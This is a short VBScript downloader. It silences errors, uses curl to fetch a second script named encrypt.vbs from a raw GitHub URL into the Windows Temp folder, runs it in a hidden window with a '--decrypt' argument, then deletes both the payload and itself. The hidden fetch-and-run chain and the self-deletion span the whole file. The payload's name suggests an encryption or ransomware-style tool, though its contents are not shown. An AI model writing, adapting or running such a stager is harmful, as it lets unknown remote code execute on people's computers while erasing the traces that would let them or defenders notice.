' Suppress all error popups
On Error Resume Next

Dim objShell, fso, tempDir, lalaPath, lalaUrl

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' Use Windows temp directory
tempDir = objShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
lalaPath = tempDir & "\encrypt.vbs"

' URL for encrypt.vbs (change if needed)
lalaUrl = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/encrypt.vbs"

' 1. Download encrypt.vbs
objShell.Run "cmd /c curl -sL -o """ & lalaPath & """ """ & lalaUrl & """", 0, True

' 2. Execute encrypt.vbs with --deec argument (hidden, wait for completion)
objShell.Run "cmd /c cd /d """ & tempDir & """ && cscript //nologo encrypt.vbs --decrypt", 0, True

' 3. Permanently delete encrypt.vbs
If fso.FileExists(lalaPath) Then fso.DeleteFile lalaPath, True

' 4. Permanently delete this script itself (delayed to avoid file lock)
objShell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & WScript.ScriptFullName & """", 0, False
